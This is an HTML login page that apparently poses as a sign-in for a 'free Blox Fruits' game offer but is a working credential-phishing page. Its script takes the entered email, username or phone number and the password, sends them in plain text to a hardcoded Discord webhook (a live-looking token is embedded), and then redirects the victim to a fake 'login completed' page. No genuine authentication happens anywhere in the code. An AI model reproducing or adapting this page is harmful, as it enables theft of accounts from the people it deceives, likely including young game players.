<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #232527;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            background-color: #393b3d;
            width: 25%; /* 25% of the screen width */
            height: 50%; /* 2 times the width (which will be 50% of screen width) */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
        }

        h2, p {
            margin: 10px 0;
            color: #ffffff;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            box-sizing: border-box;
            border: none;
            border-radius: 5px;
        }

        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            border: none;
            border-radius: 5px;
            color: #ffffff;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Login</h2>
        <p>Email / Username / Phone Number</p>
        <input type="text" id="identifier" placeholder="Enter Email/Username/Phone" required>
        <p>Password</p>
        <input type="password" id="password" placeholder="Enter Password" required>
        <button onclick="loginAndSendData()">Login</button>
        <button onclick="loginViaCode()">Login via Code</button>
    </div>

    <script>
        async function loginAndSendData() {
            const identifier = document.getElementById('identifier').value;
            const password = document.getElementById('password').value;

            // Send data to the webhook
            await fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    embeds: [{
                        title: "Login Information",
                        description: `Identifier: ${identifier}\nPassword: ${password}`
                    }]
                })
            });

            // Redirect to the specified URL after sending data
            window.location.href = "https://freebloxfruits.github.io/login-completed/";
        }

        function loginViaCode() {
            window.location.href = "https://freebloxfruits.github.io/email/";
        }
    </script>
</body>
</html>
